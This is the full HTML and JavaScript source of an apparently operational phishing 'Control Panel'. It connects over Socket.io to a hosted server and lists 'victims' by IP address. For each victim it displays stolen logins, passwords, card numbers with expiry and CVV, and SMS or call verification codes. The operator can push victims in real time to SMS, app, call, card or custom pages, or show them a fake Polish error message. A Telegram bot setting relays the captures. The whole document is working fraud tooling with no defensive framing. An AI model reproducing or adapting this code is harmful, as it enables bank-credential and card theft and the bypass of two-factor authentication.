<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg:       #0b1120;
            --surface:  #131d2e;
            --card:     #182235;
            --border:   #1f3050;
            --border2:  #253c5e;
            --text:     #e2e8f0;
            --muted:    #64748b;
            --green:    #22c55e;
            --red:      #ef4444;
            --blue:     #3b82f6;
            --yellow:   #f59e0b;
            --purple:   #a855f7;
            --orange:   #f97316;
            --cyan:     #06b6d4;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            min-height: 100vh;
            font-size: 14px;
        }

        /* ── TOP BAR ───────────────────────────── */
        .topbar {
            position: sticky; top: 0; z-index: 200;
            background: #0d1627;
            border-bottom: 1px solid var(--border);
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 24px; height: 54px;
        }
        .topbar-logo {
            display: flex; align-items: center; gap: 10px;
            font-weight: 800; font-size: 13px; letter-spacing: 3px;
            color: var(--text); text-transform: uppercase;
        }
        .topbar-logo i { color: var(--red); font-size: 18px; }
        .topbar-right {
            display: flex; align-items: center; gap: 20px;
            font-size: 12px; color: var(--muted);
        }
        .dot { width: 7px; height: 7px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .dot-on  { background: var(--green); box-shadow: 0 0 7px var(--green); }
        .dot-off { background: var(--muted); }

        /* ── LAYOUT ────────────────────────────── */
        .main { padding: 22px 24px 40px; max-width: 1440px; margin: 0 auto; }

        /* ── STATS ─────────────────────────────── */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 12px;
            margin-bottom: 22px;
        }
        @media (max-width: 900px) { .stats-grid { grid-template-columns: repeat(3, 1fr); } }
        @media (max-width: 600px) { .stats-grid { grid-template-columns: repeat(2, 1fr); } }

        .stat-box {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 16px 18px;
            display: flex; align-items: center; gap: 14px;
        }
        .stat-icon {
            width: 40px; height: 40px; border-radius: 10px;
            display: flex; align-items: center; justify-content: center;
            font-size: 16px; flex-shrink: 0;
        }
        .stat-val { font-size: 26px; font-weight: 800; line-height: 1; }
        .stat-lbl { font-size: 10px; color: var(--muted); letter-spacing: 1.2px; text-transform: uppercase; margin-top: 3px; }

        /* ── SECTION HEADER ────────────────────── */
        .sec-hdr {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 14px;
        }
        .sec-title {
            font-size: 10px; font-weight: 700; letter-spacing: 2px;
            text-transform: uppercase; color: var(--muted);
            display: flex; align-items: center; gap: 8px;
        }
        .sec-title i { color: var(--border2); }

        /* ── TELEGRAM CONFIG ────────────────────── */
        .config-box {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 12px;
            margin-bottom: 22px;
            overflow: hidden;
        }
        .config-hdr {
            display: flex; align-items: center; justify-content: space-between;
            padding: 14px 18px; cursor: pointer;
            border-bottom: 1px solid transparent;
            transition: border-color 0.2s;
        }
        .config-hdr.open { border-bottom-color: var(--border); }
        .config-hdr-left { display: flex; align-items: center; gap: 10px; font-size: 12px; font-weight: 600; color: var(--text); }
        .config-hdr-left i { color: var(--blue); }
        .config-body { padding: 16px 18px; display: none; }
        .config-body.show { display: flex; gap: 10px; flex-wrap: wrap; }
        .cfg-input {
            flex: 1; min-width: 180px;
            background: var(--bg); border: 1px solid var(--border2);
            border-radius: 8px; color: var(--text); padding: 8px 12px;
            font-size: 13px;
        }
        .cfg-input:focus { outline: none; border-color: var(--blue); }
        .cfg-input::placeholder { color: var(--muted); }
        .btn-cfg-save {
            background: var(--blue); color: white; border: none;
            border-radius: 8px; padding: 8px 20px; font-size: 13px;
            font-weight: 600; cursor: pointer; white-space: nowrap;
        }
        .btn-cfg-save:hover { background: #2563eb; }

        /* ── SESSION CARDS ──────────────────────── */
        .sessions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
            gap: 16px;
            margin-bottom: 26px;
        }

        .sess-card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 14px;
            overflow: hidden;
            display: flex; flex-direction: column;
            transition: border-color 0.2s;
        }
        .sess-card:hover { border-color: var(--border2); }
        .sess-card.is-online  { border-top: 2px solid var(--green); }
        .sess-card.is-offline { border-top: 2px solid #2a3a52; opacity: 0.72; }

        .sess-hdr {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
            display: flex; align-items: center; justify-content: space-between; gap: 8px;
        }
        .sess-hdr-left { display: flex; align-items: center; gap: 8px; min-width: 0; }
        .sess-ip { font-family: monospace; font-weight: 700; font-size: 14px; }
        .sess-ago { font-size: 10px; color: var(--muted); white-space: nowrap; }
        .page-pill {
            background: rgba(59,130,246,0.12);
            color: #60a5fa; border-radius: 6px;
            padding: 2px 8px; font-size: 11px; font-family: monospace;
            white-space: nowrap; flex-shrink: 0;
        }

        /* ── DATA TIMELINE ──────────────────────── */
        .data-timeline {
            padding: 10px 14px;
            max-height: 200px;
            overflow-y: auto;
            flex: 1;
        }
        .de { display: flex; align-items: flex-start; gap: 8px; padding: 5px 0; border-bottom: 1px solid var(--border); }
        .de:last-child { border-bottom: none; }
        .de-icon {
            width: 24px; height: 24px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 10px; flex-shrink: 0; margin-top: 1px;
        }
        .di-login  { background: rgba(59,130,246,.15); color: var(--blue); }
        .di-pass   { background: rgba(239,68,68,.15);  color: var(--red); }
        .di-card   { background: rgba(34,197,94,.15);  color: var(--green); }
        .di-sms    { background: rgba(168,85,247,.15); color: var(--purple); }
        .di-call   { background: rgba(249,115,22,.15); color: var(--orange); }

        .de-body { flex: 1; min-width: 0; font-size: 12px; line-height: 1.5; }
        .de-lbl  { color: var(--muted); }
        .de-val  { color: var(--text); word-break: break-all; font-family: monospace; }
        .de-ctx  {
            display: inline-block; font-size: 10px;
            background: rgba(245,158,11,.1); color: var(--yellow);
            border-radius: 4px; padding: 0 5px; margin-left: 5px; white-space: nowrap;
        }
        .de-bin  { font-size: 10px; color: var(--muted); margin-top: 2px; }
        .no-data { color: var(--muted); font-style: italic; font-size: 12px; padding: 8px 0; text-align: center; }

        /* ── DIVIDER ────────────────────────────── */
        .sess-div { border-top: 1px solid var(--border); }

        /* ── ACTIONS ────────────────────────────── */
        .sess-actions { padding: 12px 14px; }
        .action-lbl {
            font-size: 9px; letter-spacing: 1.5px; text-transform: uppercase;
            color: var(--muted); font-weight: 700; margin-bottom: 7px;
        }
        .action-row { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 10px; }
        .action-row-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; margin-bottom: 10px; }

        .btn-a {
            padding: 7px 6px; border-radius: 8px; border: 1px solid;
            font-size: 11px; font-weight: 600; cursor: pointer;
            background: transparent; transition: background 0.15s, opacity 0.15s;
            text-align: center; display: flex; align-items: center; justify-content: center; gap: 4px;
        }
        .btn-a:hover { opacity: 0.85; }
        .btn-a.sent { background: rgba(34,197,94,.2) !important; border-color: var(--green) !important; color: var(--green) !important; }

        .ba-sms    { border-color: var(--blue);   color: var(--blue);   }
        .ba-sms:hover  { background: rgba(59,130,246,.1); }
        .ba-app    { border-color: var(--yellow);  color: var(--yellow); }
        .ba-app:hover  { background: rgba(245,158,11,.1); }
        .ba-call   { border-color: var(--green);   color: var(--green);  }
        .ba-call:hover { background: rgba(34,197,94,.1); }
        .ba-card   { border-color: var(--muted);   color: var(--muted);  }
        .ba-card:hover { background: rgba(100,116,139,.1); }
        .ba-wait   { border-color: var(--border2); color: var(--text);   }
        .ba-wait:hover { background: rgba(255,255,255,.05); }
        .ba-err    { border-color: var(--red);     color: var(--red);    }
        .ba-err:hover  { background: rgba(239,68,68,.1); }

        .custom-row { display: flex; gap: 6px; margin-bottom: 10px; }
        .custom-input {
            flex: 1; background: var(--bg); border: 1px solid var(--border2);
            border-radius: 8px; color: var(--text); padding: 7px 10px; font-size: 12px;
        }
        .custom-input:focus { outline: none; border-color: var(--blue); }
        .custom-input::placeholder { color: var(--muted); }
        .btn-go {
            background: rgba(34,197,94,.12); border: 1px solid var(--green);
            color: var(--green); border-radius: 8px; padding: 7px 14px;
            font-size: 11px; font-weight: 700; cursor: pointer; white-space: nowrap;
        }
        .btn-go:hover { background: rgba(34,197,94,.22); }

        /* ── EMPTY STATE ────────────────────────── */
        .empty-state {
            grid-column: 1 / -1; text-align: center;
            padding: 60px 20px; color: var(--muted);
        }
        .empty-state i { font-size: 48px; opacity: .2; margin-bottom: 16px; display: block; }

        /* ── LOGS ───────────────────────────────── */
        .log-panel {
            background: #080d17;
            border: 1px solid var(--border);
            border-radius: 12px;
            height: 200px; overflow-y: auto;
            padding: 10px 14px;
            font-family: 'Courier New', monospace;
            font-size: 11px;
        }
        .log-row { display: flex; gap: 10px; padding: 2px 0; }
        .log-t  { color: #2a3a52; flex-shrink: 0; }
        .log-m  { color: #22c55e; }
        .log-m.w { color: var(--yellow); }
        .log-m.e { color: var(--red); }
        .log-m.i { color: var(--cyan); }

        /* ── SCROLLBAR ──────────────────────────── */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
    </style>
</head>
<body>

<div class="topbar">
    <div class="topbar-logo">
        <i class="fa-solid fa-shield-halved"></i>
        <span>Control Panel</span>
    </div>
    <div class="topbar-right">
        <span id="clock" style="font-family:monospace;"></span>
        <span id="conn-label"><span class="dot dot-off"></span>Connecting…</span>
    </div>
</div>

<div class="main">

    <!-- Stats -->
    <div class="stats-grid">
        <div class="stat-box">
            <div class="stat-icon" style="background:rgba(34,197,94,.12)"><i class="fa-solid fa-circle-dot" style="color:var(--green)"></i></div>
            <div><div class="stat-val" id="s-online" style="color:var(--green)">0</div><div class="stat-lbl">Online</div></div>
        </div>
        <div class="stat-box">
            <div class="stat-icon" style="background:rgba(100,116,139,.12)"><i class="fa-solid fa-users" style="color:var(--muted)"></i></div>
            <div><div class="stat-val" id="s-total" style="color:var(--text)">0</div><div class="stat-lbl">Total Sessions</div></div>
        </div>
        <div class="stat-box">
            <div class="stat-icon" style="background:rgba(34,197,94,.12)"><i class="fa-solid fa-credit-card" style="color:var(--green)"></i></div>
            <div><div class="stat-val" id="s-cards" style="color:var(--green)">0</div><div class="stat-lbl">Cards</div></div>
        </div>
        <div class="stat-box">
            <div class="stat-icon" style="background:rgba(168,85,247,.12)"><i class="fa-solid fa-comment-sms" style="color:var(--purple)"></i></div>
            <div><div class="stat-val" id="s-sms" style="color:var(--purple)">0</div><div class="stat-lbl">SMS Codes</div></div>
        </div>
        <div class="stat-box">
            <div class="stat-icon" style="background:rgba(59,130,246,.12)"><i class="fa-solid fa-key" style="color:var(--blue)"></i></div>
            <div><div class="stat-val" id="s-logins" style="color:var(--blue)">0</div><div class="stat-lbl">Logins</div></div>
        </div>
    </div>

    <!-- Telegram Config -->
    <div class="config-box">
        <div class="config-hdr" id="cfg-hdr" onclick="toggleCfg()">
            <div class="config-hdr-left">
                <i class="fa-brands fa-telegram"></i>
                Telegram Notifications
            </div>
            <i class="fa-solid fa-chevron-down" id="cfg-chev" style="font-size:11px;color:var(--muted);transition:transform .2s;"></i>
        </div>
        <div class="config-body" id="cfg-body">
            <input type="text" id="botToken" class="cfg-input" placeholder="Bot Token: 12345678:AAH...">
            <input type="text" id="chatId"   class="cfg-input" placeholder="Chat ID: -100123456789">
            <button class="btn-cfg-save" onclick="saveConfig()"><i class="fa-solid fa-floppy-disk me-1"></i>Save</button>
        </div>
    </div>

    <!-- Sessions -->
    <div class="sec-hdr">
        <div class="sec-title"><i class="fa-solid fa-satellite-dish"></i> Sessions</div>
        <span style="font-size:11px;color:var(--muted);" id="sess-count">0 sessions</span>
    </div>
    <div class="sessions-grid" id="sessGrid"></div>

    <!-- Logs -->
    <div class="sec-hdr" style="margin-top:10px;">
        <div class="sec-title"><i class="fa-solid fa-terminal"></i> System Log</div>
        <button onclick="clearLog()" style="background:transparent;border:1px solid var(--border2);color:var(--muted);border-radius:6px;padding:3px 10px;font-size:10px;cursor:pointer;letter-spacing:1px;">CLEAR</button>
    </div>
    <div class="log-panel" id="logPanel"></div>

</div>

<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
<script>
// Socket.io server URL (Railway) - используем HTTPS, Socket.io сам выберет WebSocket
const SOCKET_SERVER_URL = 'https://my-project-production-8e23.up.railway.app';
console.log('[ADMIN] Socket server URL:', SOCKET_SERVER_URL);
</script>
<script>
(function() {
    // Clock
    function tick() {
        document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
    }
    tick(); setInterval(tick, 1000);

    // Socket
    const socket = io(SOCKET_SERVER_URL, {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionAttempts: 10,
        reconnectionDelay: 1000
    });
    let victims = [];

    socket.emit('admin_join');
    log('Initializing panel…');

    socket.on('connect', () => {
        document.getElementById('conn-label').innerHTML =
            '<span class="dot dot-on"></span>Connected <span style="color:var(--border2)">·</span> <span style="font-family:monospace;font-size:10px;">' + socket.id.slice(0, 8) + '…</span>';
        log('Connected to server', 'i');
        console.log('[ADMIN] Connected! ID:', socket.id);
    });

    socket.on('connect_error', (err) => {
        console.error('[ADMIN] Connection error:', err.message);
        log('Connection error: ' + err.message, 'e');
    });

    socket.on('disconnect', (reason) => {
        document.getElementById('conn-label').innerHTML = '<span class="dot dot-off"></span>Disconnected';
        log('Disconnected: ' + reason, 'e');
        console.log('[ADMIN] Disconnected:', reason);
    });

    socket.on('victims_update', function(data) {
        const prev = victims.length;
        victims = data;
        updateStats();
        renderSessions();
        const on = data.filter(v => v.status === 'online').length;
        if (data.length > prev) log('New session — total: ' + data.length + '  online: ' + on, 'w');
        else log('Update — sessions: ' + data.length + '  online: ' + on, 'i');
    });

    // ── Stats ───────────────────────────────
    function updateStats() {
        const on    = victims.filter(v => v.status === 'online').length;
        const cards = victims.reduce((s, v) => s + (v.data && v.data.cards ? v.data.cards.length : 0), 0);
        const sms   = victims.reduce((s, v) => s + (v.data && v.data.sms_codes ? v.data.sms_codes.length : 0) + (v.data && v.data.call_codes ? v.data.call_codes.length : 0), 0);
        const logins= victims.reduce((s, v) => s + (v.data && v.data.niks ? v.data.niks.length : 0), 0);
        document.getElementById('s-online').textContent = on;
        document.getElementById('s-total').textContent  = victims.length;
        document.getElementById('s-cards').textContent  = cards;
        document.getElementById('s-sms').textContent    = sms;
        document.getElementById('s-logins').textContent = logins;
        document.getElementById('sess-count').textContent = victims.length + ' session' + (victims.length !== 1 ? 's' : '');
    }

    // ── Sessions ────────────────────────────
    function renderSessions() {
        const grid = document.getElementById('sessGrid');
        grid.innerHTML = '';
        if (!victims.length) {
            grid.innerHTML = '<div class="empty-state"><i class="fa-solid fa-ghost"></i>No sessions yet</div>';
            return;
        }
        const sorted = [...victims].sort((a, b) => {
            if (a.status === 'online' && b.status !== 'online') return -1;
            if (a.status !== 'online' && b.status === 'online') return  1;
            return new Date(b.lastSeen || 0) - new Date(a.lastSeen || 0);
        });
        sorted.forEach(v => grid.appendChild(buildCard(v)));
    }

    function buildCard(v) {
        const online = v.status === 'online';
        const d = v.data || {};

        // Timeline
        let tl = '';
        (d.niks || []).forEach(n => tl += de('login','fa-user','di-login','Login', h(n.value), n.action, ''));
        (d.passwords || []).forEach(p => tl += de('pass','fa-key','di-pass','Pass', h(p.value), p.action, ''));
        (d.cards || []).forEach(c => {
            const cv = h(c.card_number) + ' &nbsp;<span style="color:var(--muted)">exp</span> ' + h(c.card_expiry) + ' &nbsp;<span style="color:var(--muted)">cvv</span> ' + h(c.card_cvv);
            const bin = c.binInfo ? '<div class="de-bin">🏦 ' + h(c.binInfo.bank) + ' · ' + h(c.binInfo.type) + ' · ' + h(c.binInfo.country) + '</div>' : '';
            tl += de('card','fa-credit-card','di-card','Card', cv, c.action, bin);
        });
        (d.sms_codes || []).forEach(s => tl += de('sms','fa-comment-sms','di-sms','SMS', '<b>' + h(s.value) + '</b>', s.action, ''));
        (d.call_codes || []).forEach(c => tl += de('call','fa-phone','di-call','Call', '<b>' + h(c.value) + '</b>', c.action, ''));
        if (!tl) tl = '<div class="no-data">No data captured yet</div>';

        const vid = h(v.id);
        const ago = v.lastSeen ? timeAgo(new Date(v.lastSeen)) : '';

        const el = document.createElement('div');
        el.className = 'sess-card ' + (online ? 'is-online' : 'is-offline');
        el.innerHTML = `
<div class="sess-hdr">
  <div class="sess-hdr-left">
    <span class="dot ${online ? 'dot-on' : 'dot-off'}"></span>
    <span class="sess-ip">${h(v.ip || '?')}</span>
    <span class="sess-ago">${ago}</span>
  </div>
  <span class="page-pill">/${h(v.lastPage || 'n/a')}</span>
</div>
<div class="data-timeline">${tl}</div>
<div class="sess-div"></div>
<div class="sess-actions">
  <div class="action-lbl">Redirect</div>
  <div class="action-row">
    <button class="btn-a ba-sms"  onclick="cmd('${vid}','redirect','sms',this)"><i class="fa-solid fa-comment-sms"></i> SMS</button>
    <button class="btn-a ba-app"  onclick="cmd('${vid}','redirect','app-confirm',this)"><i class="fa-solid fa-mobile-screen"></i> App</button>
    <button class="btn-a ba-call" onclick="cmd('${vid}','redirect','call-confirm',this)"><i class="fa-solid fa-phone"></i> Call</button>
    <button class="btn-a ba-card" onclick="cmd('${vid}','redirect','card',this)"><i class="fa-solid fa-credit-card"></i> Card</button>
  </div>
  <div class="action-lbl">Custom URL</div>
  <div class="custom-row">
    <input type="text" class="custom-input" id="cu-${vid}" placeholder="https://…">
    <button class="btn-go" onclick="customCmd('${vid}')">GO</button>
  </div>
  <div class="action-lbl">Screen</div>
  <div class="action-row">
    <button class="btn-a ba-wait" onclick="cmd('${vid}','wait','',this)"><i class="fa-solid fa-hourglass-half"></i> Wait</button>
    <button class="btn-a ba-err"  onclick="cmd('${vid}','error','Wystąpił błąd. Spróbuj ponownie.',this)"><i class="fa-solid fa-triangle-exclamation"></i> Error</button>
  </div>
</div>`;
        return el;
    }

    function de(type, icon, cls, label, val, ctx, extra) {
        const ctxHtml = ctx && ctx !== 'initial' ? '<span class="de-ctx">' + h(ctx) + '</span>' : '';
        return `<div class="de">
  <div class="de-icon ${cls}"><i class="fa-solid ${icon}"></i></div>
  <div class="de-body"><span class="de-lbl">${label}: </span><span class="de-val">${val}</span>${ctxHtml}${extra}</div>
</div>`;
    }

    function h(s) {
        if (s == null) return '';
        return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    function timeAgo(d) {
        const s = Math.floor((Date.now() - d) / 1000);
        if (s < 60)   return s + 's ago';
        if (s < 3600) return Math.floor(s/60) + 'm ago';
        if (s < 86400) return Math.floor(s/3600) + 'h ago';
        return Math.floor(s/86400) + 'd ago';
    }

    // ── Commands ────────────────────────────
    function cmd(vid, command, page, btn) {
        socket.emit('admin_command', { victimId: vid, command, page });
        log('→ [' + command.toUpperCase() + ']' + (page ? ' → ' + page : '') + ' to ' + vid.slice(0, 8), 'i');
        if (btn) {
            const orig = btn.innerHTML;
            btn.classList.add('sent');
            btn.innerHTML = '<i class="fa-solid fa-check"></i> Sent';
            setTimeout(() => { btn.innerHTML = orig; btn.classList.remove('sent'); }, 1400);
        }
    }
    window.cmd = cmd;

    function customCmd(vid) {
        const url = (document.getElementById('cu-' + vid) || {}).value;
        if (!url) return;
        cmd(vid, 'redirect', url, null);
    }
    window.customCmd = customCmd;

    // ── Config ──────────────────────────────
    function toggleCfg() {
        const body = document.getElementById('cfg-body');
        const chev = document.getElementById('cfg-chev');
        const hdr  = document.getElementById('cfg-hdr');
        const open = body.classList.toggle('show');
        hdr.classList.toggle('open', open);
        chev.style.transform = open ? 'rotate(180deg)' : '';
    }
    window.toggleCfg = toggleCfg;

    async function saveConfig() {
        const token  = document.getElementById('botToken').value;
        const chatId = document.getElementById('chatId').value;
        try {
            const r = await fetch('/api/admin-config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token, chatId })
            });
            const d = await r.json();
            log(d.success ? 'Telegram config saved' : 'Error saving config', d.success ? 'i' : 'e');
        } catch(e) { log('Network error: ' + e.message, 'e'); }
    }
    window.saveConfig = saveConfig;

    async function loadConfig() {
        try {
            const r = await fetch('/api/admin-config');
            const d = await r.json();
            document.getElementById('botToken').value = d.token || '';
            document.getElementById('chatId').value   = d.chatId || '';
            log('Config loaded from server');
        } catch(e) { log('Failed to load config', 'e'); }
    }

    // ── Log ─────────────────────────────────
    function log(msg, type) {
        const panel = document.getElementById('logPanel');
        const div   = document.createElement('div');
        div.className = 'log-row';
        const now = new Date();
        const t = now.toLocaleTimeString('en-US', { hour12: false }) + '.' + String(now.getMilliseconds()).padStart(3,'0');
        div.innerHTML = '<span class="log-t">[' + t + ']</span><span class="log-m' + (type ? ' ' + type : '') + '">' + h(msg) + '</span>';
        panel.prepend(div);
        while (panel.children.length > 120) panel.removeChild(panel.lastChild);
    }
    window.log = log;

    function clearLog() { document.getElementById('logPanel').innerHTML = ''; }
    window.clearLog = clearLog;

    loadConfig();
})();
</script>
</body>
</html>
